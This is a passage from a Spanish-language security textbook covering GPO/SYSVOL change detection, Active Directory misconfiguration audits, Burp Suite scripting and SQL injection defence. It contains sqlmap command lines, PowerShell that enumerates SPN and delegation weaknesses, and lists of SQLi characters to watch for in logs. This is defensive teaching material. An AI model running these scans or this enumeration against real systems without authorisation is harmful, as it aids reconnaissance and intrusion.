        name = script.find('ScriptName')
        if name is not None and name.text:
            scripts.add(name.text.strip())
    return scripts

def snapshot_scripts(dir_path):
    d = {}
    for fname in os.listdir(dir_path):
        if fname.endswith('.xml'):
            fpath = os.path.join(dir_path, fname)
            scripts = extract_scripts(fpath)
            d[fname] = scripts
    return d

if len(sys.argv) != 3:
    print("Usage: python3 gpo_diff_scripts.py snapshot_old_dir snapshot_new_dir")
    sys.exit(1)

old = snapshot_scripts(sys.argv[1])
new = snapshot_scripts(sys.argv[2])

for k in sorted(set(old.keys()) | set(new.keys())):
    old_set = old.get(k, set())
    new_set = new.get(k, set())
    added = new_set - old_set
    removed = old_set - new_set
    if added or removed:
        print(f"Changes in {k}:")
        if added:
            print("  Added scripts:", added)
        if removed:
            print("  Removed scripts:", removed)
```

**Uso defensivo:** programar snapshots regulares y ejecutar esta diff; si aparecen scripts añadidos o modificados, activar investigación.

---

## 6. Detección en logs y SIEM (reglas sugeridas)

* **Alertar** si evento AD `5136` (modificación de objeto) afecta a `CN=Policies` o atributos relacionados con GPO.
* **Alertar** si archivos en `\\DOMAIN\SYSVOL\...Policies\{GUID}\` son creados/modificados por cuentas no autorizadas (auditoría de filesystem).
* **Correlación**: modificación de GPO + cambios en ACLs de SYSVOL + ejecución de tareas de admin fuera de horario → alta prioridad.
* **Integridad**: crear baseline de hashes de scripts en SYSVOL; alertar si hash cambia.
* **Anomalías temporales**: alertar si scripts aparecen con timestamps que no coinciden con ventana de mantenimiento.

---

## 7. Playbook de respuesta (cuando se detecta modificación sospechosa)

1. **Triage rápido**

   * Identificar GPO afectado, archivos modificados y cuenta que realizó el cambio (Event 5136).
   * Recolectar evidencia: copiar reportes XML, capturar ACLs y hashes de scripts (solo lectura).
2. **Contención**

   * Si hay evidencia de script malicioso, aislar hosts que hayan sido expuestos (aplicar firewall/quarantine).
   * Restaurar temporalmente GPO desde snapshot conocido si procede (hacer con coordinación y procesos formales).
3. **Análisis forense**

   * Revisar logs de SIEM, EDR, pcap de red si hay exfil/tráfico inusual.
   * Identificar alcance: ¿qué hosts aplicaron la GPO? (GPResult/RSOP, registros de aplicación de política).
4. **Erradicación**

   * Reemplazar scripts maliciosos por versiones conocidas y seguras (solo tras autorización y con procedimiento).
   * Corregir permisos en SYSVOL y revisar delegaciones.
5. **Recuperación**

   * Forzar actualización de políticas (gpupdate /force) en hosts corregidos; validar.
   * Revisar y rotar credenciales si fue uso indebido de cuentas.
6. **Lecciones aprendidas**

   * Ajustar reglas de SIEM, fortalecer controles de cambio, revisar procesos de cambio de GPO y su aprobación.

> Nota: cualquier **restauración** o **modificación** de GPO debe realizarse mediante procesos de cambio controlados y con autorización; aquí solo describimos el playbook defensivo.

---

## 8. Buenas prácticas y hardening para GPO/SYSVOL

* **Control de cambios formal**: toda modificación de GPO debe pasar por gestión de cambios (Change Management) con aprobación y registro.
* **Separación de funciones**: roles de lectura/edición/deploy en GPO separados; mínimo privilegio.
* **Protección de SYSVOL**: aplicar ACLs restrictivas; limitar quién puede escribir.
* **Auditoría obligatoria**: habilitar auditing en AD (Directory Service Changes) y FS auditing en SYSVOL; retener logs suficiente tiempo.
* **Backups y snapshots**: mantener snapshots/versiones históricas de GPOs para restauración rápida.
* **Integridad de scripts**: mantener hashes y firmas digitales de scripts sensibles; validar antes de desplegar.
* **Restricción de script languages**: limitar uso de interpretes (p. ej. bloquear ejecución de macros o archivos ejecutables en scripts si no necesario).
* **Window de mantenimiento**: programar cambios solo en ventanas definidas y notificar equipo de SOC.

---

## 9. Ejercicios de laboratorio seguros (auditoría)

* **Ejercicio A — Snapshot & diff**: exportar GPOs en dos fechas, ejecutar `gpo_diff_scripts.py` y analizar cambios; practicar triage.
* **Ejercicio B — Integridad SYSVOL**: tomar baseline de hashes de scripts, modificar uno en laboratorio (solo en entorno aislado) y verificar que las reglas SIEM y los scripts de auditoría detecten el cambio.
* **Ejercicio C — Simular cambio autorizado**: probar el flujo completo: cambio aprobado → export report → aplicar → verificar que los registros y alertas muestren actividad esperada (todas las acciones en entorno controlado).

---

## 10. Checklist operativo (resumen)

* [ ] Exportar GPOs periódicamente y almacenar snapshots firmados.
* [ ] Inventariar y auditar scripts de Startup/Shutdown/Logon/Logoff.
* [ ] Habilitar FS-auditing en SYSVOL y revisar eventos 4663/5136.
* [ ] Mantener baseline de hashes para todos los scripts en SYSVOL.
* [ ] Revisar ACLs de SYSVOL y políticas de delegación trimestralmente.
* [ ] Forzar revisión manual de cambios fuera de ventana de mantenimiento.
* [ ] Documentar y auditar cuentas con permiso para modificar GPO.
* [ ] Edición vía cambio controlado; no conexiones directas no registradas a SYSVOL.

---

## Conclusión

Las GPO y los scripts de inicio son poderosas herramientas administrativas — usadas correctamente son indispensables; mal configuradas o sin control son una puerta de entrada para compromisos masivos. Este capítulo te dio un conjunto práctico de tácticas defensivas, scripts únicamente de lectura y un playbook para investigar y remediar problemas con políticas y SYSVOL sin enseñar a modificar GPOs de forma ofensiva.

---

# Capítulo 36 — Defensa ofensiva: seguridad para entornos Active Directory

**Detección de malas prácticas y su explotación controlada (enfoque defensivo y ético)**

**Objetivos**

* Comprender el concepto de **defensa ofensiva**: pensar como un atacante para reforzar la seguridad.
* Aprender a identificar configuraciones erróneas y malas prácticas que debilitan Active Directory.
* Simular de forma **ética y segura** escenarios de explotación en entornos de laboratorio controlados.
* Implementar controles y alertas que impidan el abuso de esas debilidades.
* Diseñar un framework de auditoría continua para evaluar la seguridad de AD.

> **Aviso ético:** todo lo aquí descrito se realiza **solo** en entornos controlados o de laboratorio. El objetivo de la defensa ofensiva no es vulnerar sistemas ajenos, sino **anticipar el comportamiento del adversario** y **cerrar los huecos antes de que los exploten**.

---

## 1. Concepto de defensa ofensiva

**Defensa ofensiva** combina los principios del Red Team con los del Blue Team: usar la mentalidad ofensiva para mejorar la postura defensiva.
Mientras el Red Team busca brechas, la defensa ofensiva:

1. **Detecta las malas configuraciones antes que el atacante.**
2. **Evalúa el impacto real.**
3. **Propone remediación y validación técnica.**

Es el punto medio entre el **Threat Hunting proactivo** y la **auditoría ofensiva controlada**.

---

## 2. Principales malas prácticas en entornos AD

| Categoría                               | Ejemplo de mala práctica                                         | Impacto potencial                                         |
| --------------------------------------- | ---------------------------------------------------------------- | --------------------------------------------------------- |
| **Contraseñas**                         | Cuentas con contraseñas sin rotar, débiles o almacenadas en GPO. | Compromiso de credenciales.                               |
| **Delegación**                          | Uso de unconstrained delegation.                                 | Compromiso total de dominio si se compromete un servidor. |
| **Permisos de ACL**                     | Usuarios con `GenericAll` sobre OUs o cuentas privilegiadas.     | Escalada lateral y control de dominio.                    |
| **Cuentas de servicio**                 | SPNs sin rotación, contraseñas estáticas.                        | Riesgo de Kerberoasting o abuso de delegación.            |
| **Políticas inseguras**                 | Deshabilitar preautenticación o auditoría de cambios.            | Invisibilidad ante abusos.                                |
| **Trusts inseguros**                    | Relaciones bidireccionales innecesarias.                         | Movimiento entre dominios.                                |
| **Administradores locales sin control** | Misma contraseña en múltiples equipos.                           | Propagación rápida del ataque.                            |
| **Falta de segmentación**               | Servidores de dominio accesibles desde toda la red.              | Incremento del impacto del compromiso.                    |

---

## 3. Auditoría proactiva: pensar como un atacante, actuar como defensor

El objetivo es identificar las rutas de ataque potenciales **sin ejecutarlas**, usando herramientas legítimas en modo **read-only** o **simulación sintética**.

### Ejemplo 1 — Analizar permisos de ACL

* Usa `Get-Acl` o `Get-ADObject` para revisar si usuarios no administrativos tienen `WriteProperty`, `GenericAll`, `WriteDacl`.
* No cambies permisos; genera reportes comparativos.

### Ejemplo 2 — Evaluar contraseñas de cuentas de servicio

* Identifica cuentas con SPNs (`servicePrincipalName`).
* Comprueba la antigüedad del atributo `pwdLastSet`.
* Marca para rotación si supera 90 días o no tiene política de cambio automático (gMSA).

### Ejemplo 3 — Revisar delegaciones inseguras

* Ejecuta el script `unconstrained_audit.ps1` (Cap. 34).
* Si devuelve resultados, programa migración a constrained delegation.

### Ejemplo 4 — Simular movimiento lateral en laboratorio

* En entornos virtuales, simula escenarios con cuentas estándar y administradores para observar trazabilidad.
* Registra logs y correlaciones para validar detecciones del SIEM.

---

## 4. Scripts de auditoría defensiva (PowerShell/Python)

### PowerShell — detectar malas configuraciones críticas

```powershell
<#
AD_Security_Audit.ps1
Auditoría básica para detectar malas prácticas en AD
Solo lectura — USO ÉTICO Y AUTORIZADO
#>
Import-Module ActiveDirectory

# 1. Cuentas con contraseñas sin expirar
Get-ADUser -Filter {PasswordNeverExpires -eq $true} -Properties PasswordNeverExpires |
Select-Object SamAccountName | Export-Csv users_neverexpire.csv -NoTypeInformation

# 2. Cuentas con SPN sin rotar (pwdLastSet > 180 días)
$dateLimit = (Get-Date).AddDays(-180)
Get-ADUser -Filter {servicePrincipalName -like "*" -and pwdLastSet -lt $dateLimit} -Properties pwdLastSet, servicePrincipalName |
Select SamAccountName, pwdLastSet, servicePrincipalName |
Export-Csv spn_old_passwords.csv -NoTypeInformation

# 3. Unconstrained delegation
Get-ADObject -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)" -Properties name,servicePrincipalName |
Export-Csv unconstrained_delegation.csv -NoTypeInformation

# 4. Administradores locales con mismo hash (requires baseline)
Write-Host "Comparar hashes de admins locales en laboratorio (no incluido en este script)"
```

---

### Python — analizar resultados y generar matriz de riesgo

```python
#!/usr/bin/env python3
"""
ad_risk_matrix.py — Analiza reportes de auditoría AD y genera matriz de riesgo.
Entrada: varios CSVs de auditoría (contraseñas, SPN, delegaciones)
"""
import csv, glob

risk = []

def read_csv(path, category):
    try:
        with open(path, newline='', encoding='utf-8') as f:
            for row in csv.DictReader(f):
                user = row.get('SamAccountName') or row.get('name')
                if user:
                    risk.append((user, category))
    except Exception as e:
        print(f"[!] Error leyendo {path}: {e}")

read_csv('users_neverexpire.csv', 'Contraseña sin expirar')
read_csv('spn_old_passwords.csv', 'SPN sin rotar')
read_csv('unconstrained_delegation.csv', 'Delegación sin restricción')

# Agrupar
summary = {}
for user, cat in risk:
    summary.setdefault(user, []).append(cat)

print("{:<25} | {}".format("Cuenta", "Problemas detectados"))
print("-"*60)
for user, issues in summary.items():
    print("{:<25} | {}".format(user, ", ".join(issues)))
```

**Uso ético:** los CSVs deben provenir de entornos donde se tenga autorización.
**Propósito:** priorizar remediación, no explotar debilidades.

---

## 5. Evaluación de impacto y priorización

Clasifica las vulnerabilidades detectadas según el riesgo que representarían si un atacante las explotara:

| Riesgo      | Criterio                                                                    | Acción recomendada                                                 |
| ----------- | --------------------------------------------------------------------------- | ------------------------------------------------------------------ |
| **Crítico** | Delegación sin restricción, cuentas Domain Admin con contraseñas sin rotar. | Mitigar de inmediato, revisión de logs y rotación de credenciales. |
| **Alto**    | SPN antiguos o trusts externos bidireccionales.                             | Migrar a gMSA, auditar trusts.                                     |
| **Medio**   | Contraseñas que nunca expiran, ACLs excesivas.                              | Revisar políticas, aplicar mínimo privilegio.                      |
| **Bajo**    | Grupos obsoletos, GPO inactivas.                                            | Mantener monitoreo y limpieza programada.                          |

---

## 6. Monitoreo continuo (Defensive Red Team loop)

1. **Detectar:** auditorías periódicas con scripts.
2. **Priorizar:** clasificar riesgos según impacto.
3. **Simular:** recrear el escenario en laboratorio para medir visibilidad y tiempos de detección.
4. **Corregir:** implementar mitigaciones.
5. **Verificar:** repetir la simulación; confirmar eliminación del riesgo.
6. **Documentar:** registrar hallazgos y acciones tomadas.

Este ciclo convierte a la defensa ofensiva en un proceso continuo y medible.

---

## 7. Integración con el SIEM y el SOC

* Correlacionar los reportes del auditor con eventos 4625 (fallos de logon), 4769 (tickets), 5136 (cambios AD).
* Generar dashboards de “rutas de privilegio potenciales”.
* Implementar alertas automáticas cuando un evento coincide con una debilidad conocida.
* Mantener un inventario de “Active Exploitable Conditions” y su fecha de corrección.

---

## 8. Ejercicio práctico (laboratorio ético)

1. Crea un entorno con un dominio AD de laboratorio y un controlador secundario.
2. Aplica intencionadamente malas prácticas (p. ej. una cuenta con contraseña sin expirar, una delegación no restringida).
3. Ejecuta los scripts de auditoría y genera el reporte de riesgo.
4. Implementa las correcciones y vuelve a ejecutar el análisis.
5. Registra los tiempos de detección y validación: esa es tu **métrica de madurez defensiva**.

---

## 9. Checklist de defensa ofensiva

* [ ] Ejecutar auditorías mensuales con scripts de lectura.
* [ ] Revisar cuentas con `PasswordNeverExpires`.
* [ ] Detectar SPNs antiguos o delegaciones sin restricción.
* [ ] Auditar ACLs en OUs y objetos críticos.
* [ ] Revisar trusts y relaciones externas.
* [ ] Documentar cambios en políticas y revisarlos trimestralmente.
* [ ] Integrar detecciones con el SIEM.
* [ ] Capacitar al equipo SOC en interpretación de hallazgos.

---

## 10. Conclusión

La defensa ofensiva es la forma moderna de mantener la resiliencia: pensar como un atacante sin serlo. Un Red Teamer ético debe dominar la estructura de AD, comprender los errores que abren puertas y, sobre todo, saber cerrarlas.
La madurez defensiva no se mide solo por las alertas que saltan, sino por los **errores que nunca llegan a existir** porque fueron detectados a tiempo.

---

## Parte VI — Web Application Red Teaming

# Capítulo 37 — Pruebas profundas de aplicaciones web

**Burp Suite avanzado, extensiones y scripting (BApps y Python, uso ético)**

---

## Objetivos

* Comprender la arquitectura de Burp Suite y sus módulos avanzados.
* Aprender a integrar extensiones BApp Store y desarrollar complementos personalizados en Python.
* Automatizar pruebas de seguridad web en entornos controlados.
* Analizar respuestas y comportamientos de aplicaciones desde una perspectiva defensiva y metodológica.
* Implementar un flujo ético de pruebas que respete límites, legalidad y buenas prácticas.

> **Aviso ético:** las pruebas descritas en este capítulo solo deben realizarse sobre sistemas **de tu propiedad o con consentimiento explícito y por escrito**. Burp Suite es una herramienta poderosa; su uso fuera de los límites autorizados es ilegal. Aquí aprenderás a aplicarla con responsabilidad en entornos de laboratorio y auditorías legítimas.

---

## 1. Introducción a Burp Suite (visión avanzada)

Burp Suite es una plataforma modular para pruebas de seguridad en aplicaciones web, desarrollada por **PortSwigger**.
Su estructura se compone de:

| Módulo            | Descripción                                        | Uso avanzado                                                            |
| ----------------- | -------------------------------------------------- | ----------------------------------------------------------------------- |
| **Proxy**         | Intercepta y modifica tráfico HTTP/S.              | Configurar reglas de interceptación granular, match & replace, y scope. |
| **Target**        | Mapa de la aplicación y análisis pasivo.           | Análisis de árbol de contenido dinámico y endpoints ocultos.            |
| **Scanner (Pro)** | Escaneo activo y pasivo.                           | Custom payloads, configuración de intensidad y extensión.               |
| **Intruder**      | Ataques parametrizados controlados.                | Secuencias, fuzzing, rate limiting, payload positions.                  |
| **Repeater**      | Reenvía y modifica manualmente solicitudes.        | Pruebas manuales sobre headers y sesiones.                              |
| **Sequencer**     | Analiza aleatoriedad de tokens.                    | Revisión estadística de entropía y predictibilidad.                     |
| **Extender**      | Carga extensiones en Java, Python (Jython) o Ruby. | Automatización, integración con API y reporting.                        |

La clave del nivel avanzado está en la **automatización**: convertir tareas repetitivas en scripts controlados y reproducibles.

---

## 2. Arquitectura del Extender API y BApp Store

Burp ofrece un API interno para extender su funcionalidad mediante:

* **Burp Extender API**: interfaz que permite interactuar con cada módulo.
* **BApp Store**: repositorio oficial de extensiones revisadas (de terceros y de PortSwigger).

Ejemplos populares de extensiones (uso legítimo):

* **Logger++** – Registro detallado de tráfico.
* **Flow** – Visualización continua de peticiones/respuestas.
* **Active Scan++** – Mejora del escaneo.
* **Autorize** – Verificación de control de acceso.
* **Turbo Intruder** – Automatización masiva optimizada (solo para auditorías autorizadas).

> Consejo ético: instala extensiones solo desde BApp Store o fuentes verificadas; revisa el código antes de ejecutarlas.

---

## 3. Configuración avanzada de Burp Suite

1. **Proxy personalizado**: configura un listener en `127.0.0.1:8080`, instala el certificado CA en el navegador para interceptar tráfico HTTPS.
2. **Scope**: define dominios y rutas permitidas; activa “Proxy → Options → Intercept Client Requests → And only in scope items”.
3. **Match & Replace**: automatiza sustitución de headers o tokens durante pruebas.
4. **Project Options → Sessions**: activa macros para autenticación repetitiva (útil en pruebas prolongadas).
5. **Save State**: exporta proyectos `.burp` con snapshots reproducibles.

---

## 4. Desarrollo de extensiones con Python (Jython)

Burp Suite soporta scripting en Python mediante **Jython**, una implementación de Python sobre la JVM. Esto permite crear módulos personalizados de auditoría sin depender de Java.

### Requisitos previos

* Instalar **Jython standalone JAR** desde [https://www.jython.org/download](https://www.jython.org/download).
* Configurar Burp → *Extender* → *Options* → Ruta al Jython JAR.
* Crear el script `.py` y cargarlo desde *Extender → Extensions → Add → Python*.

---

## 5. Ejemplo ético: extensión de registro selectivo (solo lectura)

```python
# selective_logger.py
# Propósito: registrar solicitudes GET y POST del scope definido sin modificar tráfico.
# Uso: análisis pasivo en entornos autorizados.
from burp import IBurpExtender, IHttpListener
from java.io import PrintWriter

class BurpExtender(IBurpExtender, IHttpListener):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("Selective Logger")
        self.stdout = PrintWriter(callbacks.getStdout(), True)
        callbacks.registerHttpListener(self)
        self.stdout.println("[+] Selective Logger iniciado")

    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if messageIsRequest:
            request = messageInfo.getRequest()
            analyzed = self._helpers.analyzeRequest(request)
            method = analyzed.getMethod()
            url = str(analyzed.getUrl())
            # Solo registrar dentro del scope
            if self._callbacks.isInScope(analyzed.getUrl()):
                self.stdout.println("Método: {} | URL: {}".format(method, url))
```

**Qué hace:**

* Escucha todas las solicitudes.
* Registra método y URL si están dentro del scope definido.
* No altera el tráfico ni ejecuta acciones ofensivas.

**Aplicación:** ideal para auditar actividad o validar que las pruebas se mantienen dentro del alcance autorizado.

---

## 6. Automatización con la API de Burp Suite (Enterprise/Pro)

Burp Suite Pro y Enterprise ofrecen APIs REST para automatizar tareas de escaneo:

* **/v0.1/scan**: iniciar escaneos sobre targets definidos.
* **/v0.1/issues**: listar vulnerabilidades detectadas.
* **/v0.1/projects**: administrar estados y reportes.

Ejemplo en Python (uso legítimo):

```python
import requests, json

BURP_API = "https://burp.local:1337/v0.1/"
HEADERS = {"Content-Type": "application/json"}
AUTH = ("api_user","api_password")

target = {"url": "https://test.misitio.local"}
resp = requests.post(BURP_API + "scan", auth=AUTH, headers=HEADERS, data=json.dumps(target), verify=False)
print("Scan iniciado:", resp.json())
```

**Uso:** automatiza auditorías planificadas en tus entornos web internos.
**Nunca** apuntes a sistemas ajenos ni dominios externos.

---

## 7. Flujo de trabajo avanzado: integración con scripts externos

Burp Suite puede integrarse con scripts de análisis personalizados que inspeccionan respuestas y generan reportes automáticos.

Ejemplo: análisis de cabeceras de seguridad.

```python
# header_audit.py — procesamiento externo de tráfico exportado desde Burp
import csv

headers = ["Strict-Transport-Security", "Content-Security-Policy", "X-Frame-Options", "X-XSS-Protection"]
with open("burp_export.csv", newline='', encoding='utf-8') as f:
    reader = csv.DictReader(f)
    for row in reader:
        missing = [h for h in headers if h not in row['ResponseHeaders']]
        if missing:
            print(f"[!] URL {row['URL']} carece de: {', '.join(missing)}")
```

**Aplicación:** auditorías automáticas de cabeceras; no modifica solicitudes.

---

## 8. Extensiones recomendadas para pruebas avanzadas

| Extensión (BApp)   | Uso principal                                  | Valor defensivo                                  |
| ------------------ | ---------------------------------------------- | ------------------------------------------------ |
| **Logger++**       | Monitoreo y búsqueda avanzada de tráfico.      | Registro de auditoría y trazabilidad.            |
| **Flow**           | Timeline visual de peticiones.                 | Correlación y depuración de sesiones.            |
| **Autorize**       | Verificación de control de acceso.             | Detecta inconsistencias de roles.                |
| **ActiveScan++**   | Heurísticas de detección mejoradas.            | Cobertura mayor de fallas comunes.               |
| **Turbo Intruder** | Envío masivo optimizado (uso ético).           | Testeo controlado de rendimiento o validaciones. |
| **BurpBounty Pro** | Templates personalizadas para búsqueda pasiva. | Automatiza patrones de vulnerabilidad.           |

---

## 9. Integración con Python fuera de Burp (burp-reports + análisis ML)

En auditorías corporativas se suele combinar la salida de Burp con Python para generar reportes automatizados.

Ejemplo defensivo: clasificar vulnerabilidades por severidad.

```python
# classify_burp_issues.py
import json, collections

data = json.load(open("burp_issues.json"))
counts = collections.Counter([issue["severity"] for issue in data["issues"]])
for sev, count in counts.items():
    print(f"{sev.title()}: {count}")
```

Este tipo de análisis facilita priorización y gestión de vulnerabilidades.

---

## 10. Buenas prácticas de Burp Suite avanzado

1. **Define siempre el alcance (“scope”) antes de interceptar.**
2. **Usa entornos de prueba**: máquinas virtuales, sandbox, staging servers.
3. **Activa logs completos:** ayudan a evidenciar el respeto de los límites éticos.
4. **No modifiques tráfico en producción.**
5. **Aplica límites de rate** (Intruder, Scanner) para evitar DoS involuntario.
6. **Mantén actualizado Jython y las extensiones BApp.**
7. **Genera reportes automáticos y archívalos como evidencia de conformidad.**

---

## 11. Ejercicio práctico (seguro y ético)

1. Crea un entorno web vulnerable controlado (DVWA, Juice Shop, Mutillidae).
2. Configura Burp Suite con proxy local y scope limitado al dominio interno.
3. Instala extensiones: Logger++, Autorize, Flow.
4. Desarrolla una extensión simple (como `selective_logger.py`).
5. Intercepta tráfico, registra los endpoints y analiza cabeceras con tu script externo.
6. Exporta resultados a JSON y clasifica hallazgos por severidad.

Este flujo reproduce una **auditoría completa** sin riesgo ni impacto en sistemas reales.

---

## 12. Checklist operativo

* [ ] Configurar scope y CA correctamente.
* [ ] Exportar logs y reportes automáticos.
* [ ] Revisar cabeceras de seguridad básicas.
* [ ] Instalar extensiones verificadas desde BApp Store.
* [ ] Usar scripting Python solo para análisis pasivo.
* [ ] Documentar autorización y límites de prueba.
* [ ] Integrar resultados con SIEM o dashboard corporativo.
* [ ] Revisar entropía de tokens (Sequencer) solo con cuentas de prueba.

---

## Conclusión

Burp Suite, usado con criterio y ética, es un pilar de la defensa moderna de aplicaciones web. Su potencia radica tanto en las extensiones oficiales como en la posibilidad de desarrollar scripts en Python que automatizan tareas complejas.
Un Red Teamer ético utiliza estas capacidades para **auditar, mejorar y educar**, no para explotar.
La frontera entre ofensiva y defensa es el consentimiento: fuera de ese marco, no hay hacking ético.

---

# Capítulo 38 — Inyección SQL avanzada y defensa en profundidad

**Técnicas blind, time-based y exfiltración simulada (uso ético y detección automatizada)**

---

## Objetivos

* Comprender los fundamentos internos de las inyecciones SQL y sus variantes (error-based, blind, time-based).
* Explicar el comportamiento de herramientas de auditoría como **sqlmap** sin ejecutar ataques reales.
* Implementar scripts de detección y pruebas en entornos controlados.
* Aprender a prevenir vulnerabilidades SQLi en código, frameworks y bases de datos.
* Analizar logs y respuestas para detectar intentos de explotación.

> **Aviso ético y legal:** este capítulo es de **uso exclusivamente educativo y defensivo**. No se incluyen payloads, PoCs ni ejemplos explotables. Los laboratorios propuestos deben realizarse en entornos locales o con autorización explícita.

---

## 1. Fundamentos técnicos de SQLi

Una **inyección SQL** ocurre cuando los datos suministrados por el usuario se insertan directamente en una consulta SQL sin una validación o parametrización adecuada.
El atacante puede alterar la consulta original, acceder o modificar datos, o incluso ejecutar comandos arbitrarios en el servidor.

**Ejemplo conceptual (no ejecutable):**

```text
SELECT * FROM usuarios WHERE nombre = '<entrada_usuario>';
```

Si la entrada no se valida, un atacante podría manipular la cláusula WHERE para alterar la lógica de la consulta.

---

## 2. Tipos principales de inyección SQL (visión técnica)

| Tipo                    | Descripción                                               | Indicador típico                                             | Defensa                                     |
| ----------------------- | --------------------------------------------------------- | ------------------------------------------------------------ | ------------------------------------------- |
| **Error-based**         | El servidor revela mensajes de error SQL.                 | Mensajes de error visibles con nombres de tablas o columnas. | Captura y manejo de errores personalizados. |
| **Blind boolean-based** | El resultado cambia según condiciones booleanas.          | Diferencia entre respuestas TRUE/FALSE.                      | Validación y parametrización.               |
| **Time-based blind**    | El tiempo de respuesta varía según la condición.          | Respuestas con retraso deliberado.                           | Timeouts y sanitización.                    |
| **Union-based**         | Uso indebido de UNION para concatenar resultados.         | Patrones “UNION SELECT” en logs.                             | Parametrización y whitelisting.             |
| **Out-of-band (OOB)**   | Uso de canales secundarios (DNS, HTTP) para exfiltración. | Conexiones salientes desde servidor DB.                      | Firewall de salida y auditoría de red.      |

---

## 3. Arquitectura de sqlmap (entorno ético de auditoría)

**sqlmap** es una herramienta automatizada que realiza pruebas de inyección SQL.
Usada éticamente, sirve para **evaluar la resistencia** de aplicaciones propias o de laboratorio.

**Módulos principales:**

* **Detection Engine**: analiza respuestas HTTP, códigos de estado, tiempos y contenidos.
* **Injection Heuristics**: identifica parámetros vulnerables.
* **DBMS Fingerprinting**: determina tipo y versión de base de datos.
* **Payload Generator**: construye pruebas (no se usará en producción).
* **Output Processor**: clasifica hallazgos.

**Modo ético de uso:**

* Ejecutar solo contra aplicaciones locales de prueba.
* Registrar únicamente resultados de detección, sin extraer datos.
* Usar flags de auditoría (`--risk=1 --level=1`) y reportes JSON para análisis posterior.

---

## 4. Auditoría defensiva de inyecciones (sin explotación)

### a) Monitoreo de tráfico HTTP

Usar proxies como Burp Suite o ZAP para detectar parámetros sin sanitizar.

* Revisar cabeceras y cuerpo de solicitudes.
* Detectar cadenas sin codificación.
* Buscar respuestas con variaciones sospechosas (códigos 500, 200 variables).

### b) Logs y correlación

Revisar registros del servidor web y DB:

* Repeticiones con caracteres especiales (‘, ;, --, /*, sleep).
* Consultas fallidas en logs SQL.
* Variaciones en tiempo de respuesta para mismos endpoints.

### c) Filtros y validaciones

* Usar **ORMs** o **consultas parametrizadas** (`PreparedStatement`, `execute` con placeholders).
* Implementar **validación positiva (whitelist)** de entradas.
* Evitar concatenación de strings en queries.

---

## 5. Script defensivo — Auditor de entradas sin parametrizar (Python)

```python
#!/usr/bin/env python3
"""
sql_param_audit.py — Auditoría de código para detectar consultas no parametrizadas.
Propósito: revisar proyectos y localizar consultas SQL construidas por concatenación.
Uso ético: análisis de tu propio código antes de despliegue.
"""
import os, re, sys

pattern = re.compile(r"(SELECT|INSERT|UPDATE|DELETE)\s+.*\+.*", re.IGNORECASE)

def audit_folder(path):
    issues = []
    for root, _, files in os.walk(path):
        for f in files:
            if f.endswith(('.py', '.php', '.js', '.java')):
                with open(os.path.join(root, f), encoding='utf-8', errors='ignore') as code:
                    for i, line in enumerate(code, start=1):
                        if pattern.search(line):
                            issues.append((f, i, line.strip()))
    return issues

if len(sys.argv) != 2:
    print("Uso: python3 sql_param_audit.py <carpeta_proyecto>")
    sys.exit(1)

path = sys.argv[1]
results = audit_folder(path)

if not results:
    print("[✔] No se detectaron posibles concatenaciones SQL inseguras.")
else:
    print("[!] Posibles vulnerabilidades SQL detectadas:")
    for f, i, l in results:
        print(f"{f}:{i} -> {l}")
```

**Explicación:**

* Analiza archivos fuente buscando consultas SQL concatenadas dinámicamente.
* No ejecuta nada, solo detecta posibles malas prácticas.
* Ideal para integrarlo en pipelines CI/CD.

---

## 6. Integración de sqlmap en pipelines éticos

Puedes usar sqlmap para **escaneos automatizados en entornos controlados**, exportando solo la información de diagnóstico, sin explotación ni extracción.

Ejemplo de integración segura (pseudocódigo):

```bash
# Auditoría automática, solo detección
sqlmap -u "http://localhost/test.php?id=1" \
  --risk=1 --level=1 --batch --crawl=1 \
  --output-dir="auditoria_sqlmap" \
  --answers="follow=N,flushSession=N" \
  --dump-format=csv --disable-coloring
```

**Qué hace:**

* Escanea parámetros básicos, no intenta exfiltración.
* Guarda reportes en formato CSV para revisión manual.

---

## 7. Análisis de respuestas y tiempos (detección ética de blind/time-based)

Para defensores, las diferencias de tiempo o respuesta ayudan a identificar pruebas de intrusión.

| Indicador                                                 | Posible causa                      | Acción                                     |
| --------------------------------------------------------- | ---------------------------------- | ------------------------------------------ |
| Tiempos de respuesta crecientes en parámetros específicos | Intento de “time-based” blind SQLi | Establecer límites de respuesta y alertas. |
| Respuestas 500/403 alternadas con códigos 200             | Pruebas booleanas (true/false)     | Revisar validaciones y sanitización.       |
| Respuestas que contienen errores de sintaxis SQL          | Falta de manejo de errores.        | Implementar control de excepciones.        |

### Ejemplo de detección automatizada

```python
# response_diff_detector.py
import requests, statistics, time

url = "https://tuapp.local/product?id=1"
samples = []
for i in range(10):
    t0 = time.time()
    r = requests.get(url)
    t = time.time() - t0
    samples.append(t)
avg = statistics.mean(samples)
if max(samples) - min(samples) > 2.0:
    print("[!] Variación significativa detectada, posible prueba time-based SQLi.")
else:
    print("[✔] Respuesta estable. No hay indicios de pruebas SQLi.")
```

**Uso:** monitoreo pasivo para detectar irregularidades de tiempo en endpoints.

---

## 8. Mitigación y prevención

| Capa              | Medida recomendada                                                         |
| ----------------- | -------------------------------------------------------------------------- |
| **Aplicación**    | Usar prepared statements o ORM. No concatenar entradas.                    |
| **Base de datos** | Deshabilitar errores detallados en producción; limitar privilegios.        |
| **Red**           | Filtrar tráfico saliente (bloquear exfiltración OOB).                      |
| **Logs**          | Monitorear caracteres sospechosos y picos de errores SQL.                  |
| **Autenticación** | Implementar MFA y limitar exposición de cuentas con permisos de escritura. |
| **Frameworks**    | Mantener ORM actualizado, activar validación de tipo estricta.             |

---

## 9. Ejercicio práctico (laboratorio seguro)

1. Instala **DVWA** (Damn Vulnerable Web App) o **bWAPP** en una red privada.
2. Crea un entorno de pruebas con sqlmap, configurado para solo detección (`--risk=1 --level=1`).
3. Observa logs de Apache/MySQL y analiza diferencias en respuesta.
4. Implementa prepared statements en el código vulnerable y repite las pruebas: la vulnerabilidad desaparece.
5. Documenta resultados, tiempos de respuesta y mitigación aplicada.

Este laboratorio ilustra cómo detectar y **cerrar brechas**, sin explotación ni exfiltración de datos.

---

## 10. Checklist de seguridad SQLi

* [ ] Validar y sanear todas las entradas de usuario.
* [ ] Usar consultas parametrizadas (Prepared Statements).
* [ ] No concatenar cadenas en consultas SQL.
* [ ] Configurar DB con privilegios mínimos.
